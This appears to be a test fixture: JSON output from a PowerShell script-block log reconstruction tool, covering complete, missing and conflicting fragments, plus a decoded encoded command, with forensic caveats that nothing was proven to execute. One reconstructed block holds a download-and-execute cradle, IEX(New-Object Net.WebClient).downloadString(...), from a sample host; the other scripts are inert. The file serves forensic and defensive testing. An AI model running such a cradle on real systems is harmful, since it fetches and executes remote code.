@@ -1,0 +1,176 @@
+{
+  "fragments": {
+    "blocks": [
+      {
+        "source_sha256": "55ec50aa01bf87ae68c3c2e6d9888a907dd1d16975dbad330e136713102f2552",
+        "host": "PS-LAB",
+        "script_block_id": "complete-lab",
+        "complete": true,
+        "expected_parts": 2,
+        "observed_parts": [
+          1,
+          2
+        ],
+        "missing_parts": [],
+        "reasons": [],
+        "script": "Write-Output 'IEX downloadString is text'",
+        "script_sha256": "e54f937c71927a4430e386505adda3edbfca91ef820d34fdbe94b97cb55085bb",
+        "evidence": [
+          {
+            "event_uid": "1425addf2116476f0a140cfd7c8519bddbede8c68d8fe6eb03df7f7a4ea3d972",
+            "source_sha256": "55ec50aa01bf87ae68c3c2e6d9888a907dd1d16975dbad330e136713102f2552",
+            "source_line": 1,
+            "record_id": 1,
+            "timestamp": "2026-09-03T11:00:00.000000Z",
+            "host": "PS-LAB",
+            "event_id": 4104
+          },
+          {
+            "event_uid": "1ce66e037d50ea726fe28f42d58388de1029f657942e3e9af98a0e8a8f379c30",
+            "source_sha256": "55ec50aa01bf87ae68c3c2e6d9888a907dd1d16975dbad330e136713102f2552",
+            "source_line": 2,
+            "record_id": 2,
+            "timestamp": "2026-09-03T11:00:00.000000Z",
+            "host": "PS-LAB",
+            "event_id": 4104
+          }
+        ],
+        "assessment": "Static text reconstruction; not proof that each statement executed"
+      },
+      {
+        "source_sha256": "55ec50aa01bf87ae68c3c2e6d9888a907dd1d16975dbad330e136713102f2552",
+        "host": "PS-LAB",
+        "script_block_id": "missing-lab",
+        "complete": false,
+        "expected_parts": 2,
+        "observed_parts": [
+          1
+        ],
+        "missing_parts": [
+          2
+        ],
+        "reasons": [
+          "missing message parts"
+        ],
+        "script": null,
+        "script_sha256": null,
+        "evidence": [
+          {
+            "event_uid": "ab0b0da7603cb98ed6f100b2a4214e9f2281c6f8acfa43022d1bb93bad1766a5",
+            "source_sha256": "55ec50aa01bf87ae68c3c2e6d9888a907dd1d16975dbad330e136713102f2552",
+            "source_line": 3,
+            "record_id": 3,
+            "timestamp": "2026-09-03T11:00:01.000000Z",
+            "host": "PS-LAB",
+            "event_id": 4104
+          }
+        ],
+        "assessment": "Static text reconstruction; not proof that each statement executed"
+      },
+      {
+        "source_sha256": "55ec50aa01bf87ae68c3c2e6d9888a907dd1d16975dbad330e136713102f2552",
+        "host": "PS-LAB",
+        "script_block_id": "conflict-lab",
+        "complete": false,
+        "expected_parts": 1,
+        "observed_parts": [
+          1
+        ],
+        "missing_parts": [],
+        "reasons": [
+          "conflicting fragment content"
+        ],
+        "script": null,
+        "script_sha256": null,
+        "evidence": [
+          {
+            "event_uid": "6114409ad525e57fb72cafaebc7621b228d03d30d2c1208971c0794bbe8e2f2f",
+            "source_sha256": "55ec50aa01bf87ae68c3c2e6d9888a907dd1d16975dbad330e136713102f2552",
+            "source_line": 4,
+            "record_id": 4,
+            "timestamp": "2026-09-03T11:00:02.000000Z",
+            "host": "PS-LAB",
+            "event_id": 4104
+          },
+          {
+            "event_uid": "e23672cf21f9864e4327a4b7b85e59a2f0893996d8c739681c5cf7ff97a33153",
+            "source_sha256": "55ec50aa01bf87ae68c3c2e6d9888a907dd1d16975dbad330e136713102f2552",
+            "source_line": 5,
+            "record_id": 5,
+            "timestamp": "2026-09-03T11:00:02.000000Z",
+            "host": "PS-LAB",
+            "event_id": 4104
+          }
+        ],
+        "assessment": "Static text reconstruction; not proof that each statement executed"
+      }
+    ],
+    "rejected": [],
+    "scope": "same host + ScriptBlockId + source hash; cross-file and runspace attribution require analyst review"
+  },
+  "public_blocks": {
+    "blocks": [
+      {
+        "source_sha256": "6600320605ea89b7a354be24e839d146b2a82d5783ae7ad67b207bedfec5b920",
+        "host": "fs03vuln.offsec.lan",
+        "script_block_id": "965150b4-b107-4cce-9d30-1d3c55a8a085",
+        "complete": true,
+        "expected_parts": 1,
+        "observed_parts": [
+          1
+        ],
+        "missing_parts": [],
+        "reasons": [],
+        "script": "\"IEX(New-Object Net.WebClient).downloadString('https://miro.medium.com/max/1400/1*FnPDYeZVrGTbuE7Lj7JhgQ.png')\"",
+        "script_sha256": "8b2402197915c0c67ce324d27fd375ba0c66fe3f58033465ac68eadc363c1025",
+        "evidence": [
+          {
+            "event_uid": "207cb97c427683bd4a6932c68a4ab823edf3327a0e495c082851f6b439194865",
+            "source_sha256": "6600320605ea89b7a354be24e839d146b2a82d5783ae7ad67b207bedfec5b920",
+            "source_line": 1,
+            "record_id": 83421,
+            "timestamp": "2022-01-24T20:11:11.361955Z",
+            "host": "fs03vuln.offsec.lan",
+            "event_id": 4104
+          }
+        ],
+        "assessment": "Static text reconstruction; not proof that each statement executed"
+      },
+      {
+        "source_sha256": "6600320605ea89b7a354be24e839d146b2a82d5783ae7ad67b207bedfec5b920",
+        "host": "fs03vuln.offsec.lan",
+        "script_block_id": "63d67bc9-5a54-4394-8b23-363e369f3c91",
+        "complete": true,
+        "expected_parts": 1,
+        "observed_parts": [
+          1
+        ],
+        "missing_parts": [],
+        "reasons": [],
+        "script": "prompt",
+        "script_sha256": "cf07194ee232eb531e15f690000d19846dea69cf05504782658afcfacb9228a2",
+        "evidence": [
+          {
+            "event_uid": "783ce43a5f5c6e4d4a623940bb4c8bb86e73391a94b017ea57cceeffb62f9c4f",
+            "source_sha256": "6600320605ea89b7a354be24e839d146b2a82d5783ae7ad67b207bedfec5b920",
+            "source_line": 3,
+            "record_id": 83423,
+            "timestamp": "2022-01-24T20:11:11.361955Z",
+            "host": "fs03vuln.offsec.lan",
+            "event_id": 4104
+          }
+        ],
+        "assessment": "Static text reconstruction; not proof that each statement executed"
+      }
+    ],
+    "rejected": [],
+    "scope": "same host + ScriptBlockId + source hash; cross-file and runspace attribution require analyst review"
+  },
+  "decoded": {
+    "script": "Write-Output 'inert command AST fixture'",
+    "decoded_sha256": "5941b3fd0d1cfaa42dbe8b020b62d9598d7c383eea2f0a0bc722ef817a20b9b7",
+    "encoding": "UTF-16LE",
+    "assessment": "Decoded for inspection only; never executed"
+  },
+  "encoded_command": "powershell.exe -NoProfile -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGkAbgBlAHIAdAAgAGMAbwBtAG0AYQBuAGQAIABBAFMAVAAgAGYAaQB4AHQAdQByAGUAJwA="
+}
